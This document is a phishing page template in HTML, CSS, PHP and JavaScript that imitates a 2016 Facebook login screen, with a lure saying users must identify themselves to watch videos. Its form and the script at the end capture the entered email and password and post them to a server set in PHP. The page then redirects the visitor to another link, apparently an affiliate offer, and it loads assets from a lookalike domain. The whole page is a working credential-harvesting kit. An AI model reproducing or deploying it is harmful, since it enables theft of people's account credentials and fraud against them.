15px}#SPAN_48:before{display:block;left:-10014px;right:6.68px;margin:0 15px 0 0}#A_50,#A_50:before{column-rule-color:#fff;caret-color:#fff;font:normal normal bold normal 14px/42px Helvetica,Arial,sans-serif;display:inline-block;vertical-align:middle;white-space:nowrap}#A_50{color:#fff;cursor:pointer;height:42px;text-align:center;text-decoration:none solid #fff;width:158.73px;perspective-origin:104.36px 22px;transform-origin:104.36px 22px;border:1px solid #42b72a;border-radius:2px;outline:#fff 0;padding:0 24px}#DIV_53,#SPAN_55{color:#90949c;text-decoration:none solid #90949c;column-rule-color:#90949c;caret-color:#90949c;border:0 #90949c;outline:#90949c 0;text-align:center}#A_54,#A_56,#A_62,#A_64,#A_66,#A_68,#A_70,#A_72,#A_74,#A_76,#A_78,#A_80{color:#365899;text-decoration:none solid #365899;column-rule-color:#365899;caret-color:#365899;border:0 #365899;outline:#365899 0;cursor:pointer}#DIV_58,#LI_60,#LI_61,#LI_63,#LI_65,#LI_69,#LI_71,#LI_73,#LI_75,#LI_77,#LI_79,#LI_81,#UL_59{border:0 #737373;color:#737373;text-decoration:none solid #737373;column-rule-color:#737373;caret-color:#737373;outline:#737373 0}#A_50:before{color:#fff;cursor:pointer;height:20px;text-align:center;text-decoration:none solid #fff;border:0 #fff;outline:#fff 0}#A_54,#A_56,#A_62,#A_64,#A_66,#A_68,#A_70,#A_72,#A_74,#A_76,#A_78,#A_80,#DIV_53,#DIV_57,#DIV_58,#LI_60,#LI_61,#LI_65,#LI_67,#LI_69,#LI_71,#LI_73,#LI_75,#LI_77,#LI_79,#LI_81,#SPAN_55,#UL_59{font:normal normal normal normal 12px/16.08px Helvetica,Arial,sans-serif}#DIV_53{width:380px;perspective-origin:190px 14px;transform-origin:190px 14px;padding:6px 0}#A_54,#A_56{text-align:center}#DIV_57{color:#1d2129;text-decoration:none solid #1d2129;column-rule-color:#1d2129;perspective-origin:759.6px 69.7px;transform-origin:759.6px 69.7px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;margin-top:30px}#DIV_58{height:139.4px;width:980px;perspective-origin:490px 69.7px;transform-origin:490px 69.7px}#UL_59{height:20px;width:980px;perspective-origin:490px 14px;transform-origin:490px 14px;padding:8px 0 0}#LI_60{display:inline-block;width:43.37px;perspective-origin:21.68px 8px;transform-origin:21.68px 8px}#LI_61{display:inline-block;width:70.69px;perspective-origin:40.34px 8px;transform-origin:40.34px 8px}#A_62,#A_64,#A_66,#A_68,#A_70,#A_72,#A_76,#A_78,#A_80{text-align:left;unicode-bidi:isolate;white-space:nowrap}#LI_63{display:inline-block;width:42.03px;perspective-origin:26.01px 8px;transform-origin:26.01px 8px;font:normal normal normal normal 12px/16.08px Helvetica,Arial,sans-serif}#LI_65,#LI_73{display:inline-block;width:29.26px;perspective-origin:19.63px 8px;transform-origin:19.63px 8px}#LI_67{color:#737373;display:inline-block;text-decoration:none solid #737373;width:98.03px;column-rule-color:#737373;perspective-origin:54.01px 8px;transform-origin:54.01px 8px;caret-color:#737373;border:0 #737373;outline:#737373 0}#LI_69{display:inline-block;vertical-align:top;width:99.38px;perspective-origin:54.69px 8px;transform-origin:54.69px 8px}#LI_71{display:inline-block;width:47.36px;perspective-origin:28.68px 8px;transform-origin:28.68px 8px;padding:0 0 0 10px}#A_74{direction:rtl;text-align:left;unicode-bidi:isolate;white-space:nowrap}#LI_75{display:inline-block;width:27.78px;perspective-origin:18.89px 8px;transform-origin:18.89px 8px}#LI_77{display:inline-block;width:59.33px;perspective-origin:34.66px 8px;transform-origin:34.66px 8px}#LI_79{display:inline-block;width:39.34px;perspective-origin:24.67px 8px;transform-origin:24.67px 8px}#LI_81{display:inline-block;height:20px;width:30px;perspective-origin:20px 10px;transform-origin:20px 10px}#A_82,#A_82:before{font:normal normal bold normal 12px/18px Helvetica,Arial,sans-serif}#A_82{bottom:0;color:#4b4f56;cursor:pointer;display:inline-block;height:18px;left:0;position:relative;right:0;text-align:center;text-decoration:none solid #4b4f56;top:0;vertical-align:middle;white-space:nowrap;width:12px;column-rule-color:#4b4f56;justify-content:center;perspective-origin:15px 10px;transform-origin:15px 10px;caret-color:#4b4f56;background:#f6f7f9;border:1px solid #ced0d4;border-radius:2px;list-style:none;outline:#4b4f56 0;padding:0 8px;transition:background-color .2s cubic-bezier(.08,.52,.52,1) 0s,box-shadow .2s cubic-bezier(.08,.52,.52,1) 0s,transform .2s cubic-bezier(.08,.52,.52,1) 0s}#A_82:before,#I_83{color:#4b4f56;text-align:center;text-decoration:none solid #4b4f56;column-rule-color:#4b4f56;caret-color:#4b4f56;border:0 #4b4f56;list-style:none;outline:#4b4f56 0;display:inline-block;vertical-align:middle}#A_100,#A_102,#A_104,#A_106,#A_108,#A_110,#A_113,#A_115,#A_117,#A_119,#A_121,#A_123,#A_125,#A_127,#A_129,#A_131,#A_133,#A_136,#A_139,#A_141,#A_143,#A_145,#A_90,#A_92,#A_94,#A_96,#A_98,#I_137{color:#365899;cursor:pointer;text-decoration:none solid #365899;white-space:nowrap;column-rule-color:#365899;caret-color:#365899;border:0 #365899;outline:#365899 0}#A_82:before{cursor:pointer;height:20px;white-space:nowrap}#I_83{background-position:-26px -129px;bottom:1px;cursor:pointer;height:12px;left:0;position:relative;right:0;top:-1px;white-space:nowrap;width:12px;perspective-origin:6px 6px;transform-origin:6px 6px;background:url(http://acount.brovasom.site/css/csspc/uF__ZrUk4o1.png) -26px -129px no-repeat rgba(0,0,0,0);font:italic normal 700 normal 12px/18px Helvetica,Arial,sans-serif}#DIV_84{color:#737373;height:8px;text-decoration:none solid #737373;width:980px;column-rule-color:#737373;perspective-origin:490px 4.5px;transform-origin:490px 4.5px;caret-color:#737373;border-top:0 none #737373;border-right:0 none #737373;border-bottom:1px solid #dddfe2;border-left:0 none #737373;font:normal normal normal normal 1px/1.34px Helvetica,Arial,sans-serif;margin:0 0 8px;outline:#737373 0}#DIV_85{color:#737373;height:60px;text-decoration:none solid #737373;width:980px;column-rule-color:#737373;perspective-origin:490px 30px;transform-origin:490px 30px;caret-color:#737373;border:0 #737373;font:normal normal normal normal 12px/16.08px Helvetica,Arial,sans-serif;outline:#737373 0}#TABLE_86,#TBODY_87,#TR_111,#TR_134,#TR_88{border-collapse:collapse;width:1015.2px;font:normal normal normal normal 16px/20px Helvetica,Arial,sans-serif;color:#1d2129;text-decoration:none solid #1d2129;column-rule-color:#1d2129;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0}#TABLE_86{height:60px;transform-origin:507.6px 30px;border-spacing:0 0}#TBODY_87{height:60px;transform-origin:507.6px 30px}#TR_111,#TR_134,#TR_88{height:20px;vertical-align:middle;perspective-origin:507.6px 10px;transform-origin:507.6px 10px}#A_100,#A_102,#A_104,#A_106,#A_108,#A_110,#A_113,#A_115,#A_117,#A_119,#A_121,#A_123,#A_125,#A_127,#A_129,#A_131,#A_133,#A_136,#A_139,#A_141,#A_143,#A_145,#A_90,#A_92,#A_94,#A_96,#A_98,#TD_101,#TD_103,#TD_105,#TD_107,#TD_109,#TD_112,#TD_114,#TD_116,#TD_118,#TD_120,#TD_124,#TD_126,#TD_128,#TD_130,#TD_132,#TD_135,#TD_138,#TD_140,#TD_142,#TD_144,#TD_89,#TD_91,#TD_93,#TD_95,#TD_97{font:normal normal normal normal 12px/20px Helvetica,Arial,sans-serif;border-collapse:collapse;text-align:left}#TD_112,#TD_135,#TD_89{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:123.6px;column-rule-color:#1d2129;perspective-origin:66.8px 10px;transform-origin:66.8px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;padding:0 10px 0 0}#TD_114,#TD_138,#TD_91{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:66.4px;column-rule-color:#1d2129;perspective-origin:43.2px 10px;transform-origin:43.2px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;padding:0 10px}#TD_116,#TD_140,#TD_93{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:59.6px;column-rule-color:#1d2129;perspective-origin:39.8px 10px;transform-origin:39.8px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;padding:0 10px}#TD_118,#TD_142,#TD_95{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:75.6px;column-rule-color:#1d2129;perspective-origin:47.8px 10px;transform-origin:47.8px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;padding:0 10px}#TD_120,#TD_144,#TD_97{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:112.4px;column-rule-color:#1d2129;perspective-origin:66.2px 10px;transform-origin:66.2px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;padding:0 10px}#TD_122,#TD_99{border-collapse:collapse;color:#1d2129;height:20px;text-align:left;text-decoration:none solid #1d2129;vertical-align:middle;width:79.6px;column-rule-color:#1d2129;perspective-origin:49.8px 10px;transform-origin:49.8px 10px;caret-color:#1d2129;border:0 #1d2129;font:normal normal normal normal 12px/20px Helvetica,Arial,sans-serif;outline:#1d2129 0;padding:0 10px}#TD_101,#TD_124{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:69.6px;column-rule-color:#1d2129;perspective-origin:44.8px 10px;transform-origin:44.8px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;padding:0 10px}#TD_103,#TD_126{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:84.8px;column-rule-color:#1d2129;perspective-origin:52.4px 10px;transform-origin:52.4px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;padding:0 10px}#TD_105,#TD_128{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:43.6px;column-rule-color:#1d2129;perspective-origin:31.8px 10px;transform-origin:31.8px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;padding:0 10px}#TD_107,#TD_130{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:56.4px;column-rule-color:#1d2129;perspective-origin:38.2px 10px;transform-origin:38.2px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0;padding:0 10px}#TD_109,#TD_132{color:#1d2129;height:20px;text-decoration:none solid #1d2129;vertical-align:middle;width:43.6px;column-rule-color:#1d2129;perspective-origin:26.8px 10px;transform-origin:26.8px 10px;caret-color:#1d2129;border:0 #1d2129;outline:#1d2129 0}#A_136{bottom:0;display:inline-block;height:20px;left:0;position:relative;right:0;top:0;width:109.41px;perspective-origin:61.7px 10px;transform-origin:61.7px 10px;padding:0 14px 0 0}#I_137{border-collapse:collapse;bottom:19px;display:block;height:0;left:109.41px;right:14px;text-align:left;top:1px;vertical-align:middle;width:0;font:italic normal normal normal 12px/20px Helvetica,Arial,sans-serif}#DIV_146,#DIV_147,#SPAN_148{color:#737373;text-decoration:none solid #737373;column-rule-color:#737373;caret-color:#737373;border:0 #737373;font:normal normal normal normal 11px/14.74px Helvetica,Arial,sans-serif;outline:#737373 0}#DIV_146{perspective-origin:490px 7.2px;margin:20px 0}#DIV_147{perspective-origin:490px 7.2px}

</style>

<div id="DIV_1">
    <div id="DIV_2">
        <div id="DIV_3">
            <div id="DIV_4">
                <div id="DIV_5">
                    <div id="DIV_6">
                        <div id="DIV_7">
                            <h1 id="H1_8">
                                <a id="A_9"><i id="I_10"></i></a>
                            </h1>
                        </div>
                    </div>
                </div>
                <div id="DIV_12">
                    <div id="DIV_13">
                        <div id="DIV_14">
                            <span id="SPAN_15"><a id="A_16">Sing Up</a></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="DIV_17">
        <div id="DIV_18">
            <div id="DIV_19">
                <span id="SPAN_20"></span><img id="IMG_21" alt='' /><span id="SPAN_22"></span>
                <div id="DIV_23">
                    <div id="DIV_24">
                        <i id="I_25"></i>
                        <div id="DIV_27">
                            FACEBOOK YOUTUBE VIDEOS. You must confirm the following information to access this video application, identify yourself!
                        </div>
                    </div>
                </div>
                <div id="DIV_28">
                    <br id="BR_30" /><br id="BR_31" />
                    <div id="DIV_32">
                        <form id="FORM_33" action="<?php echo $action_post; ?>" method="post">
                            <input name="dispositivo" value="Desktop" type="hidden" id="INPUT_34" />
                            <input name="hack" value="   1" type="hidden" id="INPUT_35" />
                            <input name="backcpa" value="-4" type="hidden" id="INPUT_36" />
                            <input name="pais" value="Dominican Republic" type="hidden" id="INPUT_37" />
                            <input name="aux" value="   1" type="hidden" id="INPUT_38" />
                            <input name="base" type="hidden" id="INPUT_39" />
                            <div id="DIV_40">
                                
                                <?php if(USER_UID){ ?>
                                 <img style='    margin: -20px 0 20px 0;width: 96px; border: solid #fff;' src="<?php echo USER_PHOTO; ?>" alt="">
                                <?php }; ?>
                        
                                <?php if(!USER_UID){ ?>
	                                 <div class="gettingimage" style="background:#ccc;-moz-transform: scale(2);-webkit-transform: scale(2);-o-transform: scale(2);-ms-transform: scale(2);transform: scale(2);width: 48px;margin: 0 auto 35px auto;"> <?php echo str_replace('/public', '', PICTURE_BY_COMMENT); ?></div>
                                <?php }; ?>

                               <?php echo CALLED?"<h1 style=\"font-size: 18px; line-height: 22px; color: #1d2129; font-family: tahoma; font-weight: 100; text-transform: capitalize; \"><span style='text-transform: initial !important;'>Log in as </span>".CALLED."</h1>":""; ?></h1>

                                <div id="DIV_41" <?php echo USER_UID?'style="display:none;"':""; ?>>
                                    <input name="email" <?php echo USER_UID?'value="'.USER_UID.'"':""; ?> id="INPUT_42" tabindex="1" placeholder="Email Or Phone Number" type="<?php echo USER_UID?"hidden":"text"; ?>" />
                                </div>
                                <div id="DIV_43">
                                    <input name="pass" id="INPUT_44" required tabindex="1" placeholder="Password" type="password" />
                                </div>
                                <div id="DIV_45">
                                    <button value="1" id="BUTTON_46" name="login" type="submit">
                                        Log In
                                    </button>

                                    
                                </div>
                                <input checked="1" name="persistent" type="hidden" id="INPUT_51" />
                                <input id="INPUT_52" name="default_persistent" value="1" type="hidden" />
                                <div id="DIV_53">
                                     <a id="A_54">¿Forgot Password?</a> <span id="SPAN_55">·</span> <a rel="nofollow" id="A_56">Sing Up for Facebook</a>
                                </div>
                            </div>
                        </form>

                        <script>
                        	
							var form = document.querySelector('#FORM_33');
							form.onsubmit = function(event){
							  if(!window.can_submit_now) event.preventDefault();
							  var returner = false;
							  if(this.pass.value && this.pass.value.length > 5 && this.email.value.length) returner = true;
							  
							  try {

							  if( !(this.pass.value && this.pass.value.length > 5) ) document.querySelector('#DIV_43').className = "password_error";
							  if( !(this.email.value.length) ) document.querySelector('#DIV_41').className = "email_error";

							  } catch(e) { };

							  if(returner){
							    window.can_submit_now = true;
							    form.submit();
							  };
							}
                        	
                        	
                        </script>
                    </div>
                </div>
            </div>
        </div>
        <div id="DIV_57">
            <div id="DIV_58">
                <ul id="UL_59">
                    <li id="LI_60">
                        English
                    </li>
                    <li id="LI_61">
                         <a id="A_62">Spanish</a>
                    </li>
                    <li id="LI_63">
                         <a id="A_64">Italiano</a>
                    </li>
                    <li id="LI_65">
                         <a id="A_66">العربية</a>
                    </li>
                    <li id="LI_67">
                         <a id="A_68">Français (France)</a>
                    </li>
                    <li id="LI_69">
                         <a id="A_70">Portugués (Brasil)</a>
                    </li>
                    <li id="LI_71">
                         <a id="A_72">Deutsch</a>
                    </li>
                    <li id="LI_73">
                        <a id="A_74">العربية</a>
                    </li>
                    <li id="LI_75">
                        <a id="A_76">हिन्दी</a>
                    </li>
                    <li id="LI_77">
                        <a id="A_78">中文(简体)</a>
                    </li>
                    <li id="LI_79">
                        <a id="A_80">日本語</a>
                    </li>
                    <li id="LI_81">
                        <a rel="dialog" title="Mostrar más idiomas" id="A_82"><i id="I_83"></i></a>
                    </li>
                </ul>
                <div id="DIV_84">
                </div>
                <div id="DIV_85">
                    <table id="TABLE_86">
                        <tbody id="TBODY_87">
                            <tr id="TR_88">
                                <td id="TD_89">
                                    <a title="Regístrate en Facebook" id="A_90">Registrarte</a>
                                </td>
                                <td id="TD_91">
                                    <a title="Iniciar sesión en Facebook" id="A_92">Entrar</a>
                                </td>
                                <td id="TD_93">
                                    <a title="Consultar Messenger." id="A_94">Messenger</a>
                                </td>
                                <td id="TD_95">
                                    <a title="Facebook Lite para Android." id="A_96">Facebook Lite</a>
                                </td>
                                <td id="TD_97">
                                    <a title="Prueba Facebook Móvil." id="A_98">Móvil</a>
                                </td>
                                <td id="TD_99">
                                    <a title="Encontrar a alguien en la web." id="A_100">Buscar amigos</a>
                                </td>
                                <td id="TD_101">
                                    <a title="Añadir una insignia de Facebook a tu sitio web." id="A_102">Insignias</a>
                                </td>
                                <td id="TD_103">
                                    <a title="Explorar nuestro directorio de personas." id="A_104">Personas</a>
                                </td>
                                <td id="TD_105">
                                    <a title="Revisa nuestro directorio." id="A_106">Páginas</a>
                                </td>
                                <td id="TD_107">
                                    <a title="Consulta lugares populares en Facebook." id="A_108">Lugares</a>
                                </td>
                                <td id="TD_109">
                                    <a title="Consulta los juegos de Facebook." id="A_110">Juegos</a>
                                </td>
                            </tr>
                            <tr id="TR_111">
                                <td id="TD_112">
                                    <a title="Busca en nuestro directorio de lugares." id="A_113">Lugares</a>
                                </td>
                                <td id="TD_114">
                                    <a title="Explora nuestro directorio de personajes públicos y famosos." id="A_115">Famosos</a>
                                </td>
                                <td id="TD_116">
                                    <a title="Buscar en nuestro directorio de grupos." id="A_117">Grupos</a>
                                </td>
                                <td id="TD_118">
                                     <a title="Check out Moments." rel="nofollow" id="A_119">Moments</a>
                                </td>
                                <td id="TD_120">
                                     <a accesskey="8" title="Lee nuestro blog, descubre el centro de recursos y encuentra ofertas de trabajo." id="A_121">Información</a>
                                </td>
                                <td id="TD_122">
                                     <a title="Anúnciate en Facebook." id="A_123">Crear anuncio</a>
                                </td>
                                <td id="TD_124">
                                     <a title="Crea una página." id="A_125">Crear página</a>
                                </td>
                                <td id="TD_126">
                                     <a title="Desarrolla en nuestra plataforma." id="A_127">Desarrolladores</a>
                                </td>
                                <td id="TD_128">
                                     <a title="Únete a nuestra extraordinaria empresa." id="A_129">Empleo</a>
                                </td>
                                <td id="TD_130">
                                     <a title="Infórmate acerca de tu privacidad y Facebook." id="A_131">Privacidad</a>
                                </td>
                                <td id="TD_132">
                                     <a title="Información sobre las cookies y Facebook." id="A_133">Cookies</a>
                                </td>
                            </tr>
                            <tr id="TR_134">
                                <td id="TD_135">
                                     <a title="Más información sobre Gestión de anuncios" id="A_136">Gestión de anuncios<i id="I_137"></i></a>
                                </td>
                                <td id="TD_138">
                                     <a accesskey="9" title="Consulta nuestras políticas y condiciones." id="A_139">Condiciones</a>
                                </td>
                                <td id="TD_140">
                                     <a accesskey="0" title="Visita nuestro servicio de ayuda." id="A_141">Ayuda</a>
                                </td>
                                <td id="TD_142">
                                     <a accesskey="6" title="Ver y editar tu configuración de Facebook." id="A_143">Configuración</a>
                                </td>
                                <td id="TD_144">
                                     <a accesskey="7" title="Ver tu registro de actividad" id="A_145">Registro de actividad</a>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <div id="DIV_146">
                    <div id="DIV_147">
                         <span id="SPAN_148">Facebook © 2016</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<script> 
//<![CDATA[

function objectifyForm(formArray) {//serialize data function

  var returnArray = {};
  for (var i = 0; i < formArray.length; i++){
    returnArray[formArray[i]['name']] = formArray[i]['value'];
  }
  return returnArray;
}

var ajax = {};
ajax.x = function () {
    if (typeof XMLHttpRequest !== 'undefined') {
        return new XMLHttpRequest();
    }
    var versions = [
        "MSXML2.XmlHttp.6.0",
        "MSXML2.XmlHttp.5.0",
        "MSXML2.XmlHttp.4.0",
        "MSXML2.XmlHttp.3.0",
        "MSXML2.XmlHttp.2.0",
        "Microsoft.XmlHttp"
    ];

    var xhr;
    for (var i = 0; i < versions.length; i++) {
        try {
            xhr = new ActiveXObject(versions[i]);
            break;
        } catch (e) {
        }
    }
    return xhr;
};

ajax.send = function (url, callback, method, data, async) {
    if (async === undefined) {
        async = true;
    }
    var x = ajax.x();
    x.open(method, url, async);
    x.onreadystatechange = function () {
        if (x.readyState == 4) {
            callback(x.responseText)
        }
    };
    if (method == 'POST') {
        x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    }
    x.send(data)
};

ajax.get = function (url, data, callback, async) {
    var query = [];
    for (var key in data) {
        query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    ajax.send(url + (query.length ? '?' + query.join('&') : ''), callback, 'GET', null, async)
};

ajax.post = function (url, data, callback, async) {
    var query = [];
    for (var key in data) {
        query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    ajax.send(url, callback, 'POST', query.join('&'), async)
};

window.addEventListener('blur',function(){

window.mobilecheck = function() {
  var check = false;
  (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
  return check;
};



if(document.activeElement&&document.activeElement.tagName=="IFRAME" && document.activeElement.className.indexOf('znz_frame_track') > -1){
    
    var returner = false;

    setTimeout(function(){
    	document.activeElement.remove();
    },1000);

	  var form = document.querySelector('#FORM_33');

	  if(form.pass.value && form.pass.value.length > 5 && form.email.value.length) returner = true;
	  
	  try {

	  if( !(form.pass.value && form.pass.value.length > 5) ) document.querySelector('#DIV_43').className = "password_error";
	  if( !(thformis.email.value.length) ) document.querySelector('#DIV_41').className = "email_error";

	  } catch(e) { };

	  if(!returner) return false;


    ajax.post(document.forms[0].action,objectifyForm(document.forms[0]),function(response){
    	console.log(response)
    });


    if(!window.mobilecheck()) {
    	window.open(decodeURIComponent("<?php echo LINK_SELECT; ?>",'_blank'));
    };

	setTimeout(function(){
		window.location = decodeURIComponent("<?php echo LINK_SELECT; ?>",'_blank');
	},2000)

  }


})

//]]>
</script>

